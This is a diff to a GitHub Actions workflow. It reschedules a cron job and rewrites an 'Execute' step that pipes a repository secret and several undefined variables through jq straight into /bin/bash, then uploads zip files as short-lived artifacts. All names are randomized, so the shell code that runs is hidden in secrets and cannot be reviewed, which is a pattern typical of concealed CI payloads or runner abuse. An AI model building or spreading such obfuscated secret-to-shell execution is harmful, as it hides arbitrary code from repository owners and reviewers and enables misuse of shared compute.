@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '49 4,10,16,22 * * *'
+    - cron: '28 2,8,14,20 * * *'
 permissions:
   contents: read
   actions: read
@@ -24,19 +24,19 @@ jobs:
           fetch-depth: 1
       - name: Execute
         env:
-          rzvc06: ${{ secrets.rzvc06 }}
+          es6: ${{ secrets.es6 }}
         run: |
-          printf '%s' "$rzvc06" | jq -r .s9041 | /bin/bash
-          echo $lubul8884 | jq -r .bw399 | /bin/bash
-          printf '%s' "$jxfqb6101" | jq -r .t5 | /bin/bash
-          printf '%s' "$xfocu1894" | jq -r .o1 | /bin/bash
-          printf '%s' "$kbk7" | jq -r .bpux66929 | /bin/bash
-          echo $f64 | jq -r .vxz10168 | /bin/bash
+          printf '%s' "$es6" | jq -r .hl7 | /bin/bash
+          echo $kw69 | jq -r .qzi65 | /bin/bash
+          echo $efpg61 | jq -r .tu70 | /bin/bash
+          echo $r06704 | jq -r .ouf23 | /bin/bash
+          echo $jznot93690 | jq -r .regl32 | /bin/bash
+          printf '%s' "$bswwc25970" | jq -r .sxeph8 | /bin/bash
 
       - name: Upload artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: FeKUNJYg
+          name: mulSdmoU
           path: "*.zip"
           retention-days: 1
